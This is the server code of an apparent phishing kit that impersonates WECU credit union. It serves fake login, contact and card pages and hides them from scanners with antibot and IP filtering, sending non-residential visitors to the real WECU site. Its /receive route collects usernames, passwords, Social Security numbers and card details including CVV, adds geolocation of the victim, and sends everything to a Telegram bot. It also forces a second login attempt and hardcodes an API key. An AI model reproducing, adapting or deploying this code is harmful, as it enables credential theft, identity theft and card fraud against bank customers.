const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const axios = require("axios");
const fs = require("fs").promises;
const { getClientIp } = require("request-ip");
const { sendMessageFor } = require("simple-telegram-message");
const session = require("express-session");
const cookieParser = require("cookie-parser");
const csurf = require("csurf");

const rateLimiter = require("./middleware/rateLimiter");
const { validateEmail, validatePassword } = require("./middleware/receive");
const { detectBotMiddleware, fetchGeoIpData, isAllowed } = require("./middleware/antibot");
const { botToken, chatId, url, doubleLogin, residentialIP } = require("./config/settings.js");

const app = express();
const PORT = process.env.PORT || 3000;
const API_KEY = "bdc_d2f555c61bc54fe48b238633858dc30c";

console.log(`Server running at: ${url}`);

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));
app.use(rateLimiter);
app.use(detectBotMiddleware);
app.set("trust proxy", 1);

// Enable cookie parsing before CSRF protection
app.use(cookieParser());

// CSRF Protection
app.use(
  csurf({
    cookie: {
      key: "XSRF-TOKEN",
      secure: process.env.NODE_ENV === "production", // Use `true` only in production
      httpOnly: false, // Allow frontend access
      sameSite: "strict",
    },
  })
);

// Provide CSRF token for frontend
app.get("/csrf-token", (req, res) => {
  res.cookie("XSRF-TOKEN", req.csrfToken(), { secure: process.env.NODE_ENV === "production", httpOnly: false });
  res.json({ csrfToken: req.csrfToken() });
});

// Middleware to check CSRF token
const ensureCsrfToken = (req, res, next) => {
  if (!req.cookies["XSRF-TOKEN"]) {
    return res.redirect("/login");
  }
  next();
};

const viewDir = path.join(__dirname, "views");

// Function to send API request
async function sendAPIRequest(ipAddress) {
  const response = await axios.get(`https://api-bdc.net/data/ip-geolocation?ip=${ipAddress}&localityLanguage=en&key=${API_KEY}`);
  return response.data;
}

// IP Filtering Middleware
app.use(async (req, res, next) => {
	if(residentialIP){
  const ipAddress = getClientIp(req);
  if (await isAllowed(ipAddress)) {
    next();
  } else {
    res.redirect("https://href.li/?https://online.wecu.com");
  }
  }else{
  	next();
  	}
});

// Function to inject CSRF token into HTML
async function injectCsrfToken(filePath, req) {
  try {
    let htmlContent = await fs.readFile(filePath, "utf-8");

    // Inject CSRF token inside <meta> tag
    htmlContent = htmlContent.replace("</head>", `<meta name="csrf-token" content="${req.csrfToken()}"></head>`);

    return htmlContent;
  } catch (error) {
    console.error("Error reading file:", error);
    throw new Error("Internal Server Error");
  }
}

// Login route with CSRF protection
app.get("/login", async (req, res) => {
  try {
    const htmlContent = await injectCsrfToken(path.join(viewDir, "login.html"), req);
    res.send(htmlContent);
  } catch (error) {
    res.status(500).send(error.message);
  }
});

// Verification route
app.get("/verify", ensureCsrfToken, async (req, res) => {
  try {
    const action = req.query.action;
    const verifyPages = {
      "1": "contact.html",
      "2": "card.html",
    };

    const page = verifyPages[action] || "login.html";

    const htmlContent = await injectCsrfToken(path.join(viewDir, page), req);

    res.send(htmlContent);
  } catch (error) {
    res.status(500).send(error.message);
  }
});

// Redirect root to login
app.get("/", (req, res) => res.redirect("/login"));

// Protected POST route with CSRF validation
app.post("/receive", async (req, res) => {
  console.log("Received CSRF Token (from request header):", req.get("X-CSRF-Token"));

  const myObject = req.body;
  const ipAddress = getClientIp(req) || "127.0.0.1";

  try {
    const geoInfo = await sendAPIRequest(ipAddress);
    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];
    const myObjectKeys = Object.keys(myObject).map((key) => key.toLowerCase());

    const fullGeoInfo = `🌍 GEO-IP INFO\nIP: ${geoInfo.ip}\nCoordinates: ${geoInfo.location.longitude}, ${geoInfo.location.latitude}\nCity: ${geoInfo.location.city}\nState: ${geoInfo.location.principalSubdivision}\nZIP: ${geoInfo.location.postcode}\nCountry: ${geoInfo.country.name}\nTime: ${geoInfo.location.timeZone.localTime}\nISP: ${geoInfo.network.organisation}\n\n`;

    const prepareMessage = (header, type, myObject = {}, fullGeoInfo, res) => {
      if (!res || typeof res.send !== 'function') {
        console.error("Error: Response object (res) is missing or invalid in prepareMessage");
        return;
      }

      let message = `👤 ${header}\n========================\n`;

      const lowerCaseKeys = Object.fromEntries(
        Object.entries(myObject).map(([key, value]) => [key.toLowerCase(), value])
      );

      // Construct message first
      Object.entries(myObject).forEach(([key, value]) => {
        if (key.toLowerCase() !== 'visitor' && key.toLowerCase() !== 'submit' && key.toLowerCase() !== 'click' && value) {
          message += `${key.toUpperCase()}: ${value}\n`;
        }
      });

      message += `\n========================\n\n${fullGeoInfo}\n✅ UPDATE TEAM | WECU \n💬 Telegram: https://t.me/updteams\n`;

      // Validate only if auth keys exist
      const hasAuthKeys = (lowerCaseKeys.username && lowerCaseKeys.password) ||
                          (lowerCaseKeys.email && lowerCaseKeys.password) ||
                          (lowerCaseKeys.user && lowerCaseKeys.password) ||
                          (lowerCaseKeys.identifier && lowerCaseKeys.password);

      if (hasAuthKeys) {
        const isValid = (
          (lowerCaseKeys.username && validatePassword(lowerCaseKeys.password)) ||
          (lowerCaseKeys.email && validateEmail(lowerCaseKeys.email) && validatePassword(lowerCaseKeys.password)) ||
          (lowerCaseKeys.user && validatePassword(lowerCaseKeys.password))
        );
        
        console.log(lowerCaseKeys.user);

        if (!isValid) {
        	console.log("invalid auth")
           res.send({ url: "err" });
           return message;
        }
      }

      res.send({ url: type });

      return message;
    };

    let message = "";

    if (myObjectKeys.includes("username") && myObject.click >= 2 && doubleLogin) {
      message = prepareMessage("RE-LOGIN", "/verify?action=1", myObject, fullGeoInfo, res);
    } else if (myObjectKeys.includes("username") && myObject.click == 1 && doubleLogin) {
      message = prepareMessage("LOGIN", "err", myObject, fullGeoInfo, res);
    } else if (myObjectKeys.includes("username") && !doubleLogin) {
      message = prepareMessage("LOGIN", "/verify?action=1", myObject, fullGeoInfo, res);
    } else if (myObjectKeys.includes("ssn") || myObjectKeys.includes("last_name")) {
      message = prepareMessage("CONTACT INFO", "/verify?action=2", myObject, fullGeoInfo, res);
    } else if (myObjectKeys.includes("expirydate") || myObjectKeys.includes("cvv") || myObjectKeys.includes("billingzip")) {
      message = prepareMessage("BILLING INFO", url, myObject, fullGeoInfo, res);
    } else {
      return res.status(400).send({ error: "No matching keys found in request body." });
    }

    if (message) {
      // Send Telegram message
      const sendMessage = sendMessageFor(botToken, chatId);
      await sendMessage(message);
      console.log(message);
    }
  } catch (error) {
    console.error(error);
    if (!res.headersSent) {
      res.status(500).send({ error: "Internal server error" });
    }
  }
});

// Debugging middleware for CSRF tokens
app.use((req, res, next) => {
  console.log("Expected CSRF Token (from cookie):", req.cookies["XSRF-TOKEN"]);
  next();
});

// CSRF error handler
app.use((err, req, res, next) => {
  if (err.code === "EBADCSRFTOKEN") {
    console.error("CSRF Mismatch Detected!");
    console.error("Expected Token (from cookie):", req.cookies["XSRF-TOKEN"]);
    console.error("Received Token (from header):", req.get("X-CSRF-Token"));

    return res.status(403).json({ error: "Invalid CSRF token" });
  }
  next(err);
});

// Start Server
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));